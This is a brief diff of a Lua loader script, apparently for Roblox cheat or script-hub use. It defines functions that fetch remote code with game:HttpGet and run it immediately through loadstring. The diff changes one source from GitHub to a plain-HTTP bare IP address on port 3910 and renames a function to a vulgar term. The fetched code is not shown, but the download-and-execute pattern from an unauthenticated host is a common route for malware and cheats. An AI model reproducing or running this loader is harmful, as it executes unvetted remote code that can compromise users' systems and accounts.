@@ -1,14 +1,10 @@
-local function loadScript()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/tesexrahy/script-hub/refs/heads/main/loader_prev.lua"))()
+local function pidrila()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/tesexrahy/script-hub/refs/heads/main/loader_prev.lua'))()
 end
 
-local function loadingScreen()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/xeroxson/script/refs/heads/main/script"))()
+local function loadui()
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 end
 
-local function loadAll() 
-  loadingScreen()
-  loadScript()
-end
-
-task.spawn(loadAll)
+task.spawn(pidrila)
+task.spawn(loadui)
